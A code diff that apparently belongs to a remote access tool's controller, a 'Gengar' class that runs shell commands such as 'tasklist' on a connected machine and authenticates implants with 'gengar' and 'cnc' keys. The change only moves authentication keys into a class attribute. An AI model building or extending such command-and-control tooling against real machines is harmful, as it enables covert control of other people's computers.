@@ -5,6 +5,7 @@ import struct
 from dataclasses import dataclass
 from typing import Union
 
+import auth_keys
 import output
 from auth_keys import AuthenticationKeys
 from logger import logger
@@ -46,6 +47,7 @@ class Gengar:
     _authenticated: bool = False
     alive: bool = True
 
+    _AUTH_KEYS = auth_keys.get()
     _FILE_IO_CHUNK_SIZE = 8192
 
     def init(self):
@@ -155,7 +157,7 @@ class Gengar:
     def process_list(self):
         return self.shell('tasklist').output
 
-    def auth(self, auth_keys: AuthenticationKeys):
+    def auth(self):
         if self._authenticated:
             logger.info('Gengar already authenticated.')
             return
@@ -163,9 +165,9 @@ class Gengar:
         try:
             self._sock.settimeout(5)
             received_gengar_key = self._recvall(AuthenticationKeys.KEY_LEN).decode()
-            if received_gengar_key != auth_keys.gengar:
+            if received_gengar_key != self._AUTH_KEYS.gengar:
                 raise GengarAuthenticationFailed
-            self._send(auth_keys.cnc.encode())
+            self._send(self._AUTH_KEYS.cnc.encode())
             self._authenticated = True
         except socket.timeout:
             raise GengarAuthenticationFailed
